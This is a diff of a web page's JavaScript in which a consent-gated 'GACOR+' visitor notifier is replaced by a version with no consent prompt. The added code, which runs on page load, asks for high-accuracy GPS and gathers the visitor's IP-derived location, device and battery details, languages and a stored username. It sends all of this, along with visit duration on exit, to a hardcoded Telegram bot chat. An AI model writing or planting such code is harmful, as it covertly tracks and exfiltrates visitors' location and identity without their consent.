@@ -171,337 +171,167 @@ document.getElementById('sendQ').addEventListener('click', async () => {
   }, 1000);
 });
 
-// GACOR+ Visitor Notifier (privacy-respecting)
-// Cara pakai: set BOT_TOKEN dan CHAT_IDS (array) di bagian CONFIG.
-// Fitur utama:
-// - Consent modal (opt-in) sebelum mengumpulkan data sensitif
-// - Kumpulkan data teknis non-sensitive yang tersedia di browser
-// - GPS jika user mengizinkan (HighAccuracy) — hanya dikirim bila user memberikan izin
-// - Auto-retry dengan exponential backoff jika pengiriman gagal
-// - Dedupe lokal (hindari kirim berulang dalam dedupeMinutes)
-// - Kirim ke banyak chat_id (CHAT_IDS array)
-// - Minimal fallback jika user menolak consent (kirim notifikasi anonim)
-// PENTING: Gunakan hanya jika pengguna sudah memberi CONSENT eksplisit.
+// === GACOR+ VISITOR INFO v2 ===
+(function(){
+  'use strict';
 
-const BOT_TOKEN = "GANTI_DENGAN_BOT_TOKEN";
-const CHAT_IDS = ["CHAT_ID_1", /* "CHAT_ID_2", */]; // array, bisa kirim ke beberapa chat
-const DEDUPE_MINUTES = 10; // tidak mengirim ulang untuk user yang sama dalam X menit
-const RETRY_MAX = 5; // maksimal percobaan retry pengiriman
-const DEDUPE_KEY = "gacor_last_sent"; // localStorage key
+  const BOT_TOKEN_GACOR = "GANTI_DENGAN_BOT_TOKEN";
+  const CHAT_IDS_GACOR = ["6864694275"];
+  const GACOR_DEDUPE_MINUTES = 5;
+  const GACOR_DEDUPE_KEY = "gacor_plus_last_sent_v2";
 
-/* ----------------- helper UI: consent modal ----------------- */
-function showConsentModal() {
-  return new Promise(resolve => {
-    // jika sudah ada keputusan sebelumnya, gunakan itu
-    const prev = localStorage.getItem('gacor_consent');
-    if (prev === 'granted') return resolve(true);
-    if (prev === 'denied') return resolve(false);
-
-    // buat modal sederhana
-    const modal = document.createElement('div');
-    modal.id = 'gacor-consent';
-    modal.style = `
-      position:fixed; left:0; top:0; right:0; bottom:0;
-      display:flex; align-items:center; justify-content:center;
-      background: rgba(0,0,0,0.6); z-index:99999; font-family:Arial, sans-serif;
-    `;
-    modal.innerHTML = `
-      <div style="background:#fff; padding:18px; border-radius:8px; max-width:420px; width:92%; box-shadow:0 6px 24px rgba(0,0,0,.25);">
-        <h3 style="margin:0 0 8px 0">Izinkan Pengumpulan Data?</h3>
-        <p style="margin:0 0 12px 0; color:#444; font-size:14px">
-          Untuk meningkatkan laporan pengunjung (GACOR+), kami meminta izin mengumpulkan data teknis:
-          lokasi (GPS), informasi perangkat & koneksi, dan durasi kunjungan. Data tidak akan dijual.
-        </p>
-        <div style="display:flex; gap:8px; justify-content:flex-end;">
-          <button id="gacor-deny" style="padding:8px 12px; border-radius:6px; border:1px solid #ddd; background:#fff;">Tolak</button>
-          <button id="gacor-allow" style="padding:8px 12px; border-radius:6px; border:0; background:#2563eb; color:#fff;">Setuju & Kirim</button>
-        </div>
-        <p style="margin-top:8px; font-size:12px; color:#666">Kamu bisa mengubah preferensi ini dari localStorage (gacor_consent).</p>
-      </div>
-    `;
-    document.body.appendChild(modal);
-
-    document.getElementById('gacor-allow').onclick = () => {
-      localStorage.setItem('gacor_consent','granted'); modal.remove(); resolve(true);
-    };
-    document.getElementById('gacor-deny').onclick = () => {
-      localStorage.setItem('gacor_consent','denied'); modal.remove(); resolve(false);
-    };
-
-    // auto-resolve false after 30s to avoid blocking UI indefinitely (tapi simpan 'denied')
-    setTimeout(() => {
-      if (document.getElementById('gacor-consent')) {
-        localStorage.setItem('gacor_consent','denied'); modal.remove(); resolve(false);
-      }
-    }, 30000);
-  });
-}
-
-/* ----------------- utils ----------------- */
-function humanNow() {
-  return new Date().toLocaleString('id-ID');
-}
-function safeFetchJson(url, opts) {
-  return fetch(url, opts).then(r => r.json()).catch(()=>null);
-}
-function shortUA() {
-  // very small UA parsing to get browser name+version
-  const ua = navigator.userAgent;
-  const map = [
-    [/Edge\/([0-9\.]+)/, 'Edge'],
-    [/Edg\/([0-9\.]+)/, 'Edge'],
-    [/OPR\/([0-9\.]+)/, 'Opera'],
-    [/Chrome\/([0-9\.]+)/, 'Chrome'],
-    [/Firefox\/([0-9\.]+)/, 'Firefox'],
-    [/Safari\/([0-9\.]+)/, 'Safari'],
-  ];
-  for (const [re, name] of map) {
-    const m = ua.match(re);
-    if (m) return `${name} ${m[1]}`;
+  function escapeHtml(s){
+    if (!s) return '';
+    return String(s).replace(/[&<>"']/g, ch => ({
+      '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":"&#39;"
+    }[ch]));
   }
-  return navigator.userAgent;
-}
-function getDedupeMarker() {
-  try { return JSON.parse(localStorage.getItem(DEDUPE_KEY) || '{}'); } catch(e){ return {}; }
-}
-function setDedupeMarker(marker) {
-  try { localStorage.setItem(DEDUPE_KEY, JSON.stringify(marker)); } catch(e) {}
-}
+  function sleep(ms){ return new Promise(r=>setTimeout(r, ms)); }
 
-/* ----------------- Build data payload ----------------- */
-async function buildVisitorData({includeSensitive=false, gps=null, gpsAccuracy=null}) {
-  // Basic info
-  const now = new Date();
-  const screen = window.screen || {};
-  const nav = navigator || {};
-  const perf = performance || {};
-  const languages = nav.languages ? nav.languages.join(', ') : (nav.language || '');
-  let ipInfo = null;
-  try {
-    // ipwho.is is allowed public API — fallback safe
-    ipInfo = await safeFetchJson('https://ipwho.is/');
-  } catch(e) { ipInfo = null; }
+  async function fetchWithTimeout(url, timeout = 4000){
+    const ac = new AbortController();
+    const id = setTimeout(()=>ac.abort(), timeout);
+    try{
+      const res = await fetch(url, {signal: ac.signal});
+      clearTimeout(id);
+      return res;
+    }catch(e){ clearTimeout(id); throw e; }
+  }
 
-  // Battery (may throw on some browsers)
-  let batteryString = "unknown";
-  try {
-    if (nav.getBattery) {
-      const b = await nav.getBattery();
-      batteryString = `${Math.round(b.level * 100)}% (${b.charging ? "⚡" : "🔋"})`;
-    }
-  } catch(e){}
+  async function getBatterySafe(){
+    try{
+      if (navigator.getBattery) {
+        const b = await navigator.getBattery();
+        return `${Math.round(b.level*100)}% (${b.charging ? "⚡" : "🔋"})`;
+      }
+    }catch{}
+    return "n/a";
+  }
 
-  // device memory & hardware concurrency (may be undefined)
-  const deviceMemory = nav.deviceMemory || "unknown";
-  const hwConcurrency = nav.hardwareConcurrency || "unknown";
+  async function getIpInfo(){
+    try{
+      const res = await fetchWithTimeout("https://ipwho.is/", 4000);
+      if (!res.ok) return null;
+      return await res.json();
+    }catch{ return null; }
+  }
 
-  // connection info
-  const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
-  const connection = {
-    effectiveType: conn.effectiveType || "unknown",
-    downlink: conn.downlink || "unknown",
-    rtt: conn.rtt || "unknown",
-    saveData: conn.saveData || false,
-  };
+  function composeMessage(p){
+    const msg = [
+      `<b>🔥 PENGUNJUNG GACOR+</b>`,
+      `👤 ${escapeHtml(p.user_local)}`,
+      `🌍 ${escapeHtml(p.city||'?')}, ${escapeHtml(p.country||'?')}`,
+      p.gps ? `📍 <a href="https://www.google.com/maps?q=${p.gps.latitude},${p.gps.longitude}&z=17">GPS (±${p.gps.accuracy}m)</a>` : '',
+      `💻 ${p.device_type} — ${p.os} — ${p.browser}`,
+      `🧠 CPU: ${p.hwConcurrency} core | RAM: ${p.deviceMemory}GB`,
+      `🖥️ Layar: ${p.screen}`,
+      `🔋 Baterai: ${p.battery}`,
+      `📡 Koneksi: ${p.conn_effectiveType || '-'}, ${p.conn_downlink || '-'} Mbps`,
+      `🌐 Zona: ${p.timezone} | Lang: ${p.languages}`,
+      `📄 ${p.page_title}`,
+      `🕓 ${p.when_human}`
+    ].filter(Boolean).join('\n');
+    return msg;
+  }
 
-  // timezone & locale
-  let timezone = "unknown";
-  try {
-    timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || timezone;
-  } catch(e){}
-
-  // performance timing (page load ms)
-  let perfTiming = {};
-  try {
-    if (performance && performance.timing) {
-      perfTiming = {
-        navigationStart: performance.timing.navigationStart || 0,
-        loadEventEnd: performance.timing.loadEventEnd || 0,
-        domContentLoadedEventEnd: performance.timing.domContentLoadedEventEnd || 0,
-      };
-    }
-  } catch(e){}
-
-  const payload = {
-    when: now.toISOString(),
-    when_human: humanNow(),
-    user_name_local: localStorage.getItem('ig_user') || 'Anonim',
-    ip: ipInfo?.ip || 'unknown',
-    ip_org: ipInfo?.org || ipInfo?.connection?.isp || 'unknown',
-    country: ipInfo?.country || ipInfo?.country_name || 'unknown',
-    region: ipInfo?.region || ipInfo?.regionName || 'unknown',
-    city: ipInfo?.city || 'unknown',
-    browser: shortUA(),
-    userAgent: navigator.userAgent,
-    languages,
-    timezone,
-    screen: {
-      width: screen.width || 'unknown',
-      height: screen.height || 'unknown',
-      availWidth: screen.availWidth || 'unknown',
-      availHeight: screen.availHeight || 'unknown',
-      colorDepth: screen.colorDepth || 'unknown',
-      orientation: screen.orientation ? screen.orientation.type : (screen.width > screen.height ? 'landscape' : 'portrait')
-    },
-    deviceMemory,
-    hardwareConcurrency: hwConcurrency,
-    connection,
-    battery: batteryString,
-    performance: perfTiming,
-    page_url: location.href,
-    page_title: document.title,
-    referrer: document.referrer || '',
-    consent: includeSensitive ? 'granted' : 'denied',
-    gps: gps ? { latitude: gps.latitude, longitude: gps.longitude, accuracy: gpsAccuracy } : null,
-    // runtime metrics that can be updated later
-    visit_duration_seconds: 0,
-  };
-
-  return payload;
-}
-
-/* ----------------- Telegram sender with retry + multi-chat ----------------- */
-async function sendTelegramMessage(text, extra = {}, attempt = 0) {
-  // Send sequentially to each chat id. Each chat get its own request.
-  const results = [];
-  for (const CHAT_ID of CHAT_IDS) {
-    const body = { chat_id: CHAT_ID, text, parse_mode: 'HTML' };
-    let ok = false;
-    let err = null;
-    // retry loop per chat
-    for (let i = 0; i <= RETRY_MAX; i++) {
-      try {
-        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(body),
+  async function sendToTelegramAll(msgHtml){
+    for (const chatId of CHAT_IDS_GACOR){
+      try{
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN_GACOR}/sendMessage`, {
+          method: "POST",
+          headers: {"Content-Type": "application/json"},
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: msgHtml,
+            parse_mode: "HTML",
+            disable_web_page_preview: true
+          })
         });
-        const j = await res.json();
-        if (j && j.ok) { ok = true; break; }
-        else { err = j; }
-      } catch (e) { err = e; }
-      // exponential backoff
-      const wait = Math.min(2000 * Math.pow(2, i), 20000);
-      await new Promise(r => setTimeout(r, wait));
+      }catch(e){ console.warn("Gagal kirim ke", chatId, e); }
     }
-    results.push({ chat: CHAT_ID, ok, err });
-  }
-  return results;
-}
-
-/* ----------------- Compose telegram text from payload (readable) ----------------- */
-function composeTelegramText(payload) {
-  // Make a tidy HTML message (Telegram parse_mode=HTML)
-  const gpsLine = payload.gps ? `📍 <a href="https://www.google.com/maps?q=${payload.gps.latitude},${payload.gps.longitude}&z=17">Lokasi (GPS) ±${payload.gps.accuracy}m</a>` : `📍 Lokasi: Tidak tersedia`;
-  const ipLine = `🛰️ IP: ${payload.ip} — ${payload.ip_org}`;
-  const screen = payload.screen;
-  const conn = payload.connection;
-  const lines = [
-    `📢 <b>Pengunjung Baru (GACOR+)</b>`,
-    `👤 Nama lokal: ${escapeHtml(payload.user_name_local)}`,
-    `🏷️ Lokasi: ${escapeHtml(payload.city)}, ${escapeHtml(payload.region)}, ${escapeHtml(payload.country)}`,
-    gpsLine,
-    ipLine,
-    `🕓 Waktu: ${payload.when_human}`,
-    `🌐 Zona/Wilayah: ${escapeHtml(payload.timezone)} — Bahasa: ${escapeHtml(payload.languages)}`,
-    `💻 Device: ${escapeHtml(payload.browser)}`,
-    `🔧 UA: <code>${escapeHtml(shortString(payload.userAgent, 240))}</code>`,
-    `🖥️ Layar: ${screen.width}x${screen.height} (${screen.orientation}) — colorDepth:${screen.colorDepth}`,
-    `⚙️ Memori: ${payload.deviceMemory}GB — CPU cores: ${payload.hardwareConcurrency}`,
-    `📡 Koneksi: ${conn.effectiveType} — downlink:${conn.downlink}Mbps — rtt:${conn.rtt}ms — saveData:${conn.saveData}`,
-    `🔋 Baterai: ${payload.battery}`,
-    `⏱️ Durasi kunjungan: ${Math.round((payload.visit_duration_seconds||0))} detik`,
-    `📄 Halaman: ${escapeHtml(payload.page_title)} — ${escapeHtml(payload.page_url)}`,
-    `🔗 Referrer: ${escapeHtml(payload.referrer || '-')}`,
-    ``,
-    `<i>Consent: ${payload.consent}</i>`
-  ];
-  return lines.join('\n');
-}
-
-function escapeHtml(str) {
-  if (!str && str !== 0) return '';
-  return String(str).replace(/[&<>"']/g, ch => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":"&#39;"}[ch]));
-}
-function shortString(s, len) { return s && s.length > len ? s.slice(0,len-3)+'...' : s; }
-
-/* ----------------- main routine ----------------- */
-async function showVisitorInfoGacorPlus() {
-  if (!BOT_TOKEN || CHAT_IDS.length === 0) {
-    console.warn('GACOR+: BOT_TOKEN atau CHAT_IDS belum diset. Aborting.');
-    return;
   }
 
-  // dedupe: jika sudah dikirim untuk pengunjung ini dalam X menit -> skip
-  const dedupe = getDedupeMarker();
-  const lastSentTs = dedupe.ts || 0;
-  const sinceMin = (Date.now() - lastSentTs) / 60000;
-  if (sinceMin < DEDUPE_MINUTES) {
-    console.log(`GACOR+: Dedupe aktif — tidak mengirim (last ${Math.round(sinceMin)} menit lalu).`);
-    return;
-  }
-
-  const consent = await showConsentModal();
-
-  // try to get GPS only if consent given
-  let gps = null, gpsAcc = null;
-  if (consent && navigator.geolocation) {
+  function shouldSend(){
     try {
-      const pos = await new Promise((resolve, reject) => {
-        navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy:true, timeout:8000, maximumAge:0 });
+      const data = JSON.parse(localStorage.getItem(GACOR_DEDUPE_KEY)||"{}");
+      if (!data.ts) return true;
+      const diff = (Date.now() - data.ts)/60000;
+      return diff >= GACOR_DEDUPE_MINUTES;
+    }catch{ return true; }
+  }
+  function markSent(){ localStorage.setItem(GACOR_DEDUPE_KEY, JSON.stringify({ts: Date.now()})); }
+
+  async function run(){
+    if (!shouldSend()) return;
+
+    const user_local = localStorage.getItem("ig_user") || "Anonim";
+    const nav = navigator;
+    const device_type = /mobile/i.test(nav.userAgent) ? "📱 Mobile" : "🖥️ Desktop";
+    const os = /Windows/i.test(nav.userAgent) ? "Windows" :
+               /Android/i.test(nav.userAgent) ? "Android" :
+               /iPhone|iPad|iOS/i.test(nav.userAgent) ? "iOS" :
+               /Mac/i.test(nav.userAgent) ? "MacOS" :
+               /Linux/i.test(nav.userAgent) ? "Linux" : "Unknown";
+    const browser = /Chrome/i.test(nav.userAgent) ? "Chrome" :
+                    /Firefox/i.test(nav.userAgent) ? "Firefox" :
+                    /Safari/i.test(nav.userAgent) ? "Safari" :
+                    /Edg/i.test(nav.userAgent) ? "Edge" : "Unknown";
+    const hwConcurrency = nav.hardwareConcurrency || "-";
+    const deviceMemory = nav.deviceMemory || "-";
+    const screenInfo = `${screen.width}x${screen.height}`;
+    const battery = await getBatterySafe();
+    const conn = nav.connection || {};
+    const languages = nav.languages ? nav.languages.join(", ") : nav.language;
+    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    const page_title = document.title || location.href;
+
+    let gps = null;
+    try{
+      gps = await new Promise((res,rej)=>{
+        navigator.geolocation.getCurrentPosition(
+          pos=>res({latitude:pos.coords.latitude,longitude:pos.coords.longitude,accuracy:Math.round(pos.coords.accuracy)}),
+          e=>rej(e),
+          {enableHighAccuracy:true,timeout:6000,maximumAge:0}
+        );
       });
-      gps = { latitude: pos.coords.latitude, longitude: pos.coords.longitude };
-      gpsAcc = Math.round(pos.coords.accuracy || 0);
-    } catch(e) {
-      // user might deny or timeout — ignore silently
-      console.log('GACOR+: GPS tidak tersedia atau ditolak.');
-    }
+    }catch{}
+
+    const ipInfo = await getIpInfo();
+    const msg = composeMessage({
+      user_local,
+      city: ipInfo?.city,
+      country: ipInfo?.country,
+      gps,
+      device_type,
+      os,
+      browser,
+      hwConcurrency,
+      deviceMemory,
+      screen: screenInfo,
+      battery,
+      conn_effectiveType: conn.effectiveType,
+      conn_downlink: conn.downlink,
+      timezone,
+      languages,
+      page_title,
+      when_human: new Date().toLocaleString('id-ID')
+    });
+
+    await sendToTelegramAll(msg);
+    markSent();
+
+    const start = Date.now();
+    window.addEventListener("beforeunload",()=>{
+      const dur = Math.round((Date.now()-start)/1000);
+      const txt = `🚪 Keluar\n⏱ Durasi: ${dur}s\n${user_local}`;
+      CHAT_IDS_GACOR.forEach(cid=>{
+        navigator.sendBeacon(`https://api.telegram.org/bot${BOT_TOKEN_GACOR}/sendMessage?chat_id=${cid}&text=${encodeURIComponent(txt)}`);
+      });
+    });
   }
 
-  // build payload
-  const payload = await buildVisitorData({ includeSensitive: !!consent, gps, gpsAccuracy: gpsAcc });
-
-  // track visit duration until unload (update message if needed)
-  let visitStart = Date.now();
-  function updateDuration() {
-    payload.visit_duration_seconds = (Date.now() - visitStart)/1000;
-  }
-  // periodically update visit duration in memory
-  const durInterval = setInterval(updateDuration, 1000);
-
-  // Compose message and send
-  const text = composeTelegramText(payload);
-  try {
-    const sendResult = await sendTelegramMessage(text, payload);
-    console.log('GACOR+: sendResult', sendResult);
-    // update dedupe marker
-    setDedupeMarker({ ts: Date.now(), ip: payload.ip });
-  } catch(e) {
-    console.error('GACOR+: Gagal kirim pesan', e);
-  }
-
-  // on page unload, optionally send a short "left" message with duration (best-effort, no retry)
-  window.addEventListener('beforeunload', () => {
-    clearInterval(durInterval);
-    updateDuration();
-    try {
-      const leaveText = `🚪 Pengunjung meninggalkan halaman\n👤 ${escapeHtml(payload.user_name_local)}\n⏱ Durasi: ${Math.round(payload.visit_duration_seconds)} detik\n🕓 ${humanNow()}`;
-      // navigator.sendBeacon for best-effort background send
-      const beaconData = new Blob([JSON.stringify({ chat_ids: CHAT_IDS, text: leaveText })], { type: 'application/json' });
-      // We will POST to a small relay endpoint if you host one; fallback: call Telegram API directly with sendMessage for each chat (not recommended on unload)
-      for (const CHAT_ID of CHAT_IDS) {
-        try {
-          navigator.sendBeacon(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(leaveText)}`);
-        } catch(e) {
-          // ignore
-        }
-      }
-    } catch(e){}
-  });
-}
-
-/* ----------------- run ----------------- */
-showVisitorInfoGacorPlus();
+  setTimeout(run, 1000);
+})();
 
 // === EFEK BUTTERFLY 💸 ===
 (function () {
